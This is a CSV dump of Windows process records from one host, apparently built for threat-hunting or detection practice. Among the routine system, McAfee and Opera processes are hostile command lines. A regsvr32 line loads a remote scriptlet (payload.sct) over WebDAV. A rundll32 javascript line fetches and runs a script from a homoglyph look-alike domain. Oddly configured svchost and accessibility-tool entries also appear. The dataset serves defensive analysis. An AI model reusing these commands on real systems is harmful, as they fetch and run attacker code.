,arguments,hostname,name,path,pid,username
20,c:\windows\system32\svchost.exe -k localservice -p -s EventSystem,0000TEBSE,svchost.exe,c:\windows\system32,444,NT AUTHORITY\SYSTEM
21,"""fontdrvhost.exe""",0000TEBSE,fontdrvhost.exe,C:\Windows\System32,3176,NT AUTHORITY\SYSTEM
23,,0000TEBSE,MsMpEng.exe,,6384,NT AUTHORITY\SYSTEM
24,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date,0000TEBSE,powershell.exe,C:\Windows\System32\powershell.exe,3516,ellie.diaz52
25,C:\Windows\System32\regsvr32 /u /n /s /i:\webdavserver\folder\payload.sct scrobj.dll,0000TEBSE,wscript.exe,C:\Windows\System32\wscript.exe,1628,NT AUTHORITY\SYSTEM
26,c:\windows\system32\svchost.exe -k localservice -p -s BthAvctpSvc,0000TEBSE,svchost.exe,c:\windows\system32,2864,NT AUTHORITY\SYSTEM
27,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p,0000TEBSE,svchost.exe,C:\Windows\system32,6132,NT AUTHORITY\SYSTEM
28,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TrkWks,0000TEBSE,svchost.exe,c:\windows\system32,3424,NT AUTHORITY\SYSTEM
29,c:\windows\system32\svchost.exe -k localservice -p -s bthserv,0000TEBSE,svchost.exe,c:\windows\system32,64,NT AUTHORITY\SYSTEM
30,c:\windows\system32\svchost.exe -k networkservice -p -s LanmanWorkstation,0000TEBSE,svchost.exe,c:\windows\system32,1256,NT AUTHORITY\SYSTEM
31,c:\windows\system32\svchost.exe -k netsvcs -p -s lfsvc,0000TEBSE,svchost.exe,c:\windows\system32,5272,NT AUTHORITY\SYSTEM
32,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0000TEBSE,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,4496,ivy.hil
33,c:\windows\system32\svchost.exe -k localservice -p -s WebClient,0000TEBSE,svchost.exe,c:\windows\system32,5172,NT AUTHORITY\SYSTEM
36,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0000TEBSE,McPvTray.exe,C:\Program Files\McAfee\MAT,4540,ivy.hil
37,c:\windows\system32\svchost.exe -k rpcss -p,0000TEBSE,svchost.exe,c:\windows\system32,5980,NT AUTHORITY\SYSTEM
38,c:\windows\system32\svchost.exe -k netsvcs -p -s WpnService,0000TEBSE,svchost.exe,c:\windows\system32,4356,NT AUTHORITY\SYSTEM
39,"""dwm.exe""",0000TEBSE,dwm.exe,C:\Windows\System32,732,NT AUTHORITY\SYSTEM
40,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s PcaSvc,0000TEBSE,svchost.exe,c:\windows\system32,1512,NT AUTHORITY\SYSTEM
41,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",0000TEBSE,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,4816,NT AUTHORITY\SYSTEM
42,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",0000TEBSE,PEFService.exe,C:\Program Files\Common Files\McAfee\PEF\CORE,2976,ivy.hil
43,"""C:\Windows\system32\SearchFilterHost.exe"" 0 736 740 748 8192 744 ",0000TEBSE,SearchFilterHost.exe,C:\Windows\system32,5132,NT AUTHORITY\SYSTEM
44,c:\windows\system32\svchost.exe -k localservice -p -s LicenseManager,0000TEBSE,svchost.exe,c:\windows\system32,4984,NT AUTHORITY\SYSTEM
45,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",0000TEBSE,modulecoreservice.exe,c:\program files\common files\mcafee\modulecore,6376,ivy.hil
46,"""C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",0000TEBSE,opera.exe,C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52,5502,darc.flore1
47,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p,0000TEBSE,svchost.exe,C:\Windows\system32,944,NT AUTHORITY\SYSTEM
50,sihost.exe,0000TEBSE,sihost.exe,c:\windows\system32,6412,NT AUTHORITY\SYSTEM
51,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts,0000TEBSE,svchost.exe,C:\Windows\System32,2116,NT AUTHORITY\SYSTEM
53,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0000TEBSE,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,4590,ivy.hil
54,c:\windows\system32\svchost.exe -k netsvcs -p -s LanmanServer,0000TEBSE,svchost.exe,c:\windows\system32,620,NT AUTHORITY\SYSTEM
55,"""fontdrvhost.exe""",0000TEBSE,fontdrvhost.exe,C:\Windows\system32,320,NT AUTHORITY\SYSTEM
56,,0000TEBSE,csrss.exe,,3552,NT AUTHORITY\SYSTEM
57,"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",0000TEBSE,vmware-usbarbitrator64.exe,C:\Program Files (x86)\Common Files\VMware\USB,3944,ivy.hil
58,"""C:\Users\ivy.hil\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0000TEBSE,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\ivy.hil\AppData\Local\Temp\scoped_dir9616_4071,1148,ivy.hil
59,\??\C:\Windows\system32\conhost.exe 0x4,0000TEBSE,conhost.exe,C:\Windows\system32,6476,NT AUTHORITY\SYSTEM
60,c:\windows\system32\svchost.exe -k netsvcs -p -s Themes,0000TEBSE,svchost.exe,c:\windows\system32,4332,NT AUTHORITY\SYSTEM
61,,0000TEBSE,System,,1232,NT AUTHORITY\SYSTEM
62,,0000TEBSE,Registry,,1032,NT AUTHORITY\SYSTEM
63,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s TimeBrokerSvc,0000TEBSE,svchost.exe,c:\windows\system32,424,NT AUTHORITY\SYSTEM
64,"""C:\Users\ryamorr\AppData\Local\Programs\Python\Python37\python.exe"" ",0000TEBSE,python.exe,C:\Users\ryamorr\AppData\Local\Programs\Python\Python37,853,ryamorr
65,C:\Windows\System32\svchost.exe -k utcsvc -p,0000TEBSE,svchost.exe,C:\Windows\System32,6256,NT AUTHORITY\SYSTEM
66,c:\windows\system32\svchost.exe -k networkservice -p -s TapiSrv,0000TEBSE,svchost.exe,c:\windows\system32,52,NT AUTHORITY\SYSTEM
67,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",0000TEBSE,UIHost.exe,C:\Program Files\McAfee\WebAdvisor,3664,ivy.hil
68,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0000TEBSE,McDiReg.exe,C:\ProgramData\McAfee\Direct,2343,ivy.hil
69,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,0000TEBSE,svchost.exe,C:\Windows\System32,3036,NT AUTHORITY\SYSTEM
70,,0000TEBSE,SecurityHealthService.exe,,540,NT AUTHORITY\SYSTEM
71,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0000TEBSE,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,2335,ivy.hil
72,c:\windows\system32\svchost.exe -k netsvcs -p -s BITS,0000TEBSE,svchost.exe,c:\windows\system32,4056,NT AUTHORITY\SYSTEM
73,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0000TEBSE,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,5883,ivy.hil
74,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0000TEBSE,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,2694,ivy.hil
75,c:\windows\system32\svchost.exe -k unistacksvcgroup -s WpnUserService,0000TEBSE,svchost.exe,c:\windows\system32,1268,NT AUTHORITY\SYSTEM
77,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",0000TEBSE,McApExe.exe,C:\Program Files\Common Files\McAfee\VSCore_18_6,4821,ivy.hil
78,C:\Windows\system32\svchost.exe -k SDRSVC,0000TEBSE,svchost.exe,C:\Windows\system32,5904,NT AUTHORITY\SYSTEM
79,,,utilman.exe,C:\Windows\System32\utilman.exe,5160,NT AUTHORITY\SYSTEM
80,C:\Windows\system32\BtwRSupportService.exe,0000TEBSE,BtwRSupportService.exe,C:\Windows\system32,1676,NT AUTHORITY\SYSTEM
82,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0000TEBSE,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,4364,ivy.hil
84,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DeviceAssociationService,0000TEBSE,svchost.exe,c:\windows\system32,4928,NT AUTHORITY\SYSTEM
87,c:\windows\system32\svchost.exe -k localservice -p -s WdiServiceHost,0000TEBSE,svchost.exe,c:\windows\system32,6060,NT AUTHORITY\SYSTEM
88,c:\windows\system32\svchost.exe -k netsvcs -p -s ShellHWDetection,0000TEBSE,svchost.exe,c:\windows\system32,6020,NT AUTHORITY\SYSTEM
89,c:\windows\system32\svchost.exe -k localservice -p -s SstpSvc,0000TEBSE,svchost.exe,c:\windows\system32,124,NT AUTHORITY\SYSTEM
90,"""C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",0000TEBSE,opera.exe,C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52,4811,darc.flore1
92,c:\windows\system32\svchost.exe -k networkservice -p -s CryptSvc,0000TEBSE,svchost.exe,c:\windows\system32,3756,NT AUTHORITY\SYSTEM
93,C:\Windows\system32\ApplicationFrameHost.exe -Embedding,0000TEBSE,ApplicationFrameHost.exe,C:\Windows\system32,5084,NT AUTHORITY\SYSTEM
95,c:\windows\system32\svchost.exe -k netsvcs -p -s TokenBroker,0000TEBSE,svchost.exe,c:\windows\system32,4200,NT AUTHORITY\SYSTEM
97,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s WinHttpAutoProxySvc,0000TEBSE,svchost.exe,c:\windows\system32,2176,NT AUTHORITY\SYSTEM
98,c:\windows\system32\svchost.exe -k unistacksvcgroup -s CDPUserSvc,0000TEBSE,svchost.exe,c:\windows\system32,816,NT AUTHORITY\SYSTEM
101,"""C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe""",0000TEBSE,vmware-authd.exe,C:\Program Files (x86)\VMware\VMware Player,5516,ivy.hil
102,C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,0000TEBSE,svchost.exe,C:\Windows\system32,2872,NT AUTHORITY\SYSTEM
103,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},0000TEBSE,taskhostw.exe,c:\windows\system32,5216,NT AUTHORITY\SYSTEM
104,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s AudioEndpointBuilder,0000TEBSE,svchost.exe,c:\windows\system32,5168,NT AUTHORITY\SYSTEM
107,,0000TEBSE,NisSrv.exe,,4744,NT AUTHORITY\SYSTEM
109,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s Dhcp,0000TEBSE,svchost.exe,c:\windows\system32,300,NT AUTHORITY\SYSTEM
111,C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F},0000TEBSE,DllHost.exe,C:\Windows\system32,3640,NT AUTHORITY\SYSTEM
112,C:\Windows\System32\svchost.exe -k NetworkService,0000TEBSE,svchost.exe,C:\Windows\System32\svchost.exe,820,ivy.hil
113,"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:\http://www.Шikipedia.com.au/netlgn.js'"").Exec();""",0000TEBSE,rundll32.exe,C:\Windows\System32\rundll32.exe,1088,ryamorr
115,c:\windows\system32\svchost.exe -k localservice -p -s FontCache,0000TEBSE,svchost.exe,c:\windows\system32,4616,NT AUTHORITY\SYSTEM
117,c:\windows\system32\svchost.exe -k netsvcs -p -s Schedule,0000TEBSE,svchost.exe,c:\windows\system32,6444,NT AUTHORITY\SYSTEM
119,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0000TEBSE,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,4712,ivy.hil
120,c:\windows\system32\svchost.exe -k localserviceandnoimpersonation -p -s SSDPSRV,0000TEBSE,svchost.exe,c:\windows\system32,2972,NT AUTHORITY\SYSTEM
122,"""C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",0000TEBSE,opera.exe,C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52,2321,darc.flore1
123,C:\Windows\System32\spoolsv.exe,0000TEBSE,spoolsv.exe,C:\Windows\System32,6484,NT AUTHORITY\SYSTEM
125,"""ctfmon.exe""",0000TEBSE,ctfmon.exe,C:\Windows\system32,6036,NT AUTHORITY\SYSTEM
127,c:\windows\system32\svchost.exe -k netsvcs,0000TEBSE,svchost.exe,c:\windows\system32,2388,NT AUTHORITY\SYSTEM
129,c:\windows\system32\svchost.exe -k netsvcs -p -s Appinfo,0000TEBSE,svchost.exe,c:\windows\system32,3596,NT AUTHORITY\SYSTEM
130,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SensorService,0000TEBSE,svchost.exe,c:\windows\system32,608,NT AUTHORITY\SYSTEM
134,c:\windows\system32\svchost.exe -k localservicenonetwork -p -s DPS,0000TEBSE,svchost.exe,c:\windows\system32,3644,NT AUTHORITY\SYSTEM
136,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s StorSvc,0000TEBSE,svchost.exe,c:\windows\system32,5560,NT AUTHORITY\SYSTEM
138,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",0000TEBSE,McDiReg.exe,C:\ProgramData\McAfee\Direct,3280,ivy.hil
140,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s NcbService,0000TEBSE,svchost.exe,c:\windows\system32,2548,NT AUTHORITY\SYSTEM
141,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0000TEBSE,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,3643,ivy.hil
143,c:\windows\system32\svchost.exe -k netsvcs -p -s SENS,0000TEBSE,svchost.exe,c:\windows\system32,1968,NT AUTHORITY\SYSTEM
147,c:\windows\system32\svchost.exe -k localservice -p -s nsi,0000TEBSE,svchost.exe,c:\windows\system32,1396,NT AUTHORITY\SYSTEM
148,C:\Windows\Explorer.EXE,0000TEBSE,Explorer.EXE,C:\Windows,2160,NT AUTHORITY\SYSTEM
150,c:\windows\system32\svchost.exe -k localservice -p -s netprofm,0000TEBSE,svchost.exe,c:\windows\system32,4864,NT AUTHORITY\SYSTEM
151,"""C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0000TEBSE,opera.exe,C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52,1019,darc.flore1
152,,0000TEBSE,svchost.exe,,1788,NT AUTHORITY\SYSTEM
154,C:\Windows\System32\WinLogon.exe -SpecialSession,0000TEBSE,WinLogon.exe,C:\Windows\System32,5852,NT AUTHORITY\SYSTEM
155,c:\windows\system32\svchost.exe -k netsvcs -p -s Winmgmt,0000TEBSE,svchost.exe,c:\windows\system32,3272,NT AUTHORITY\SYSTEM
163,,0000TEBSE,Memory Compression,,6112,NT AUTHORITY\SYSTEM
166,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TabletInputService,0000TEBSE,svchost.exe,c:\windows\system32,828,NT AUTHORITY\SYSTEM
167,C:\Windows\system32\svchost.exe -k LocalService -p,0000TEBSE,svchost.exe,C:\Windows\system32,688,NT AUTHORITY\SYSTEM
176,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DsSvc,0000TEBSE,svchost.exe,c:\windows\system32,4152,NT AUTHORITY\SYSTEM
178,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",0000TEBSE,MFEAvSvc.exe,C:\Program Files\McAfee\MfeAV,6158,ivy.hil
184,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0000TEBSE,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,2187,ivy.hil
185,c:\windows\system32\svchost.exe -k appmodel -p -s StateRepository,0000TEBSE,svchost.exe,c:\windows\system32,5508,NT AUTHORITY\SYSTEM
188,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",0000TEBSE,mcuicnt.exe,C:\Program Files\Common Files\mcafee\Platform,4207,ivy.hil
192,C:\Windows\System32\svchost.exe -k gk7myw,0000TEBSE,svchost.exe,C:\Windows\System32\svchost.exe,4392,ivy.hil
193,C:\Windows\System32\svchost.exe -k NetworkService -p -s DoSvc,0000TEBSE,svchost.exe,C:\Windows\System32,896,NT AUTHORITY\SYSTEM
195,,0000TEBSE,SgrmBroker.exe,,476,NT AUTHORITY\SYSTEM
197,"C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\darc.flore1\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\darc.flore1\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0000TEBSE,opera_crashreporter.exe,C:\Users\darc.flore1\AppData\Local\Programs\Opera\56.0.3051.52,6046,darc.flore1
201,,0000TEBSE,wininit.exe,,3064,NT AUTHORITY\SYSTEM
210,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s EventLog,0000TEBSE,svchost.exe,c:\windows\system32,2860,NT AUTHORITY\SYSTEM
217,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SysMain,0000TEBSE,svchost.exe,c:\windows\system32,432,NT AUTHORITY\SYSTEM
237,"""C:\Users\ryamorr\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",0000TEBSE,OneDrive.exe,C:\Users\ryamorr\AppData\Local\Microsoft\OneDrive,5481,ryamorr
239,,0000TEBSE,Narrator.exe,C:\Windows\System32\Narrator.exe,5420,NT AUTHORITY\SYSTEM
240,"""C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe"" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca",0000TEBSE,LockApp.exe,C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy,2940,NT AUTHORITY\SYSTEM
244,c:\windows\system32\svchost.exe -k dcomlaunch -p -s LSM,0000TEBSE,svchost.exe,c:\windows\system32,3468,NT AUTHORITY\SYSTEM
249,c:\windows\system32\svchost.exe -k networkservice -p -s Dnscache,0000TEBSE,svchost.exe,c:\windows\system32,4788,NT AUTHORITY\SYSTEM
251,c:\windows\system32\svchost.exe -k localservice -p -s CDPSvc,0000TEBSE,svchost.exe,c:\windows\system32,4872,NT AUTHORITY\SYSTEM
253,,0000TEBSE,smss.exe,,1304,NT AUTHORITY\SYSTEM
263,"""C:\Program Files\KeePassXC\KeePassXC.exe"" ",0000TEBSE,KeePassXC.exe,C:\Program Files\KeePassXC,2739,ivy.hil
